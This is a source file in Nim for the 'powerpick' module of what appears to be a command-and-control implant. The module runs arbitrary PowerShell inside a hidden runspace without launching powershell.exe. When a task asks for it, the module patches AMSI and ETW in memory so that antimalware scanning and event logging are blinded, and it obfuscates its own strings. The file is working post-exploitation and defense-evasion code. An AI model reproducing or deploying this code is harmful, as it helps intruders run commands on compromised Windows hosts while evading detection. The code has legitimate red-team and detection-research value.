import json
import ../utils/strenc

when defined(windows):
  import winim/clr except `[]`
  import winim/lean
  import ../utils/patches
  
  type
    PowerpickArgs = object
      command: string
      patch_amsi_arg: bool
      block_etw_arg: bool

proc powerpick*(taskId: string, params: JsonNode): JsonNode =
  ## Execute a PowerShell command via System.Management.Automation assembly
  ## without calling powershell.exe
  when not defined(windows):
    return %*{
      obf("task_id"): taskId,
      obf("completed"): true,
      obf("status"): "error",
      obf("user_output"): obf("powerpick is only supported on Windows")
    }
  else:
    try:
      let args = to(params, PowerpickArgs)
      
      if args.command.len == 0:
        return %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("Command cannot be empty")
        }
      
      var output = obf("Executing command via unmanaged PowerShell...\n")
      
      # Apply patches if requested
      if args.patch_amsi_arg:
        let res = patchAMSI()
        case res
        of 0:
          output.add(obf("[+] AMSI patched successfully!\n"))
        of 1:
          output.add(obf("[-] Failed to patch AMSI\n"))
        of 2:
          output.add(obf("[+] AMSI already patched\n"))
        else:
          discard
      
      if args.block_etw_arg:
        let res = patchETW()
        case res
        of 0:
          output.add(obf("[+] ETW patched successfully!\n"))
        of 1:
          output.add(obf("[-] Failed to patch ETW\n"))
        of 2:
          output.add(obf("[+] ETW already patched\n"))
        else:
          discard
      
      # Load System.Management.Automation and create runspace
      output.add(obf("[*] Creating PowerShell runspace...\n"))
      let Automation = load(obf("System.Management.Automation"))
      let RunspaceFactory = Automation.GetType(obf("System.Management.Automation.Runspaces.RunspaceFactory"))
      
      var runspace = @RunspaceFactory.CreateRunspace()
      var pipeline = runspace.CreatePipeline()
      
      runspace.Open()
      pipeline.Commands.AddScript(args.command)
      pipeline.Commands.Add(obf("Out-String"))
      
      output.add(obf("[*] Executing command...\n"))
      var pipeOut = pipeline.Invoke()
      
      output.add(obf("\n=== PowerShell Output ===\n"))
      for i in countUp(0, pipeOut.Count() - 1):
        output.add($pipeOut.Item(i))
      output.add(obf("========================\n"))
      
      runspace.Dispose()
      output.add(obf("[+] Command execution completed\n"))
      
      return %*{
        obf("task_id"): taskId,
        obf("completed"): true,
        obf("status"): obf("success"),
        obf("user_output"): output
      }
      
    except Exception as e:
      return %*{
        obf("task_id"): taskId,
        obf("completed"): true,
        obf("status"): "error",
        obf("user_output"): obf("Failed to execute PowerShell command: ") & e.msg
      }